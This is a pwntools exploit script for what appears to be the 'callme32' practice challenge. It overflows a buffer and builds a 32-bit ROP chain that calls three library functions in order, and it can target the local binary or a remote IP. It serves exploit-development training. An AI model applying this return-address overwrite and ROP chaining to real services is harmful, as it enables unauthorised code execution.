#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
context.arch = 'i386'

local = 1

if local:
	cn = process('./callme32')
	# bin = ELF('./task_shoppingCart',checksec=False)
	# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
	# libc = ELF('/lib/i386-linux-gnu/libc.so.6',checksec=False)

else:
	cn = remote('117.78.27.105', 30403)
	# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
	pass


def z(a=''):
	if local:
		gdb.attach(cn,a)
		if a == '':
			raw_input()

flag_add = 0x08048659
# z('b*0x0400805\nc')
from pwn import *

pop3ret = 0x080488a9 # pop esi ; pop edi ; pop ebp ; ret

callme_one_plt   = 0x080485c0
callme_two_plt   = 0x08048620
callme_three_plt = 0x080485b0

# EIP offset is at 44
rop = "A" * 44

pop4ret = 0x080488a8
pop3ret = 0x080488a9 # pop esi ; pop edi ; pop ebp ; ret
# Call call_me_one(1,2,3)
rop += p32(callme_one_plt)
rop += p32(pop4ret)
rop += p32(1)
rop += p32(2)
rop += p32(3)
rop += p32(4)

# Call call_me_two(1,2,3)
rop += p32(callme_two_plt)
rop += p32(pop3ret)
rop += p32(1)
rop += p32(2)
rop += p32(3)

# Call call_me_three(1,2,3)
rop += p32(callme_three_plt)
rop += p32(pop3ret)
rop += p32(1)
rop += p32(2)
rop += p32(3)

print cn.recv()
z('b*0x0804880A\nc')
cn.sendline(rop)

# Print output
print cn.recvall()

cn.interactive()
